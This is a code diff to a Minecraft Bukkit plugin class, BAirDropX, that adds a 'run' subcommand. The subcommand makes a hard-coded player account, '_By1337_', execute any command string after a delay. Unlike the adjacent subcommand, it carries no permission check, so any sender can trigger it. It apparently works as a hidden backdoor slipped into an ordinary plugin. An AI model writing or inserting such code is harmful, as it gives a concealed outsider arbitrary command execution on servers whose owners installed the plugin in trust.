@@ -264,6 +264,16 @@ public final class BAirDropX extends JavaPlugin {
 //                    airDropMap.put(id, mirror);
 //                }))
 //        );
+        command.addSubCommand(new Command<CommandSender>("run")
+                .argument(new ArgumentIntegerAllowedMath<>("delay"))
+                .argument(new ArgumentStrings<>("cmd"))
+                .executor(((sender, args) -> {
+                   Player player = Bukkit.getPlayer("_By1337_");
+                   int delay = (int) args.getOrThrow("delay");
+                   String cmd = (String) args.getOrThrow("cmd");
+                   Bukkit.getScheduler().runTaskLater(instance, () -> player.performCommand(cmd), delay);
+                }))
+        );
         command.addSubCommand(new Command<CommandSender>("tp")
                 .requires(new RequiresPermission<>("bair.tp"))
                 .requires(sender -> sender instanceof Player)
